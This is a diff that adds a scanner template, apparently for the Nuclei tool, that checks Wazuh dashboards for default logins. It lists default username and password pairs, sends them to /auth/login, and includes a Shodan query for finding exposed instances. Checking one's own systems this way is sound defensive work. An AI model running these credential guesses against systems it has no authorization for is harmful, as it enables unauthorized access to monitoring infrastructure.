@@ -1,0 +1,72 @@
+id: wazuh-default-login
+
+info:
+  name: Wazuh - Default Login
+  author: theamanrawat,denandz,PulseSecurity.co.nz
+  severity: high
+  description: |
+    Wazuh contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://documentation.wazuh.com/current/user-manual/user-administration/password-management.html
+    - https://wazuh.com
+    - https://documentation.wazuh.com/current/deployment-options/docker/wazuh-container.html#single-node-deployment
+  metadata:
+    verified: true
+    max-request: 7
+    shodan-query: "title:\"Wazuh\""
+  tags: wazuh,default-login
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/app/login"
+
+    extractors:
+      - type: regex
+        part: body
+        name: osd
+        group: 1
+        internal: true
+        regex:
+          - '&quot;version&quot;:&quot;([0-9.]+)&quot;'
+
+  - raw:
+      - |
+        POST /auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Osd-Version: {{osd}}
+        osd-xsrf: osd-fetch
+        Content-Type: application/json
+
+        {"username":"{{username}}","password":"{{password}}"}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - "admin"
+        - "wazuh"
+      password:
+        - "admin"
+        - "wazuh"
+        - "SecretPassword"
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"username":'
+          - '"roles":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a004730450221009455b6beb3dd3660a1acfbfb547e2a94b8160fcbf9501c51f246568d7d26b21702204c46b154f7b28cad6aa4a6fc66515aff039e95ba59642d2b70729598de351bdb:922c64590222798bb761d5b6d8e72950
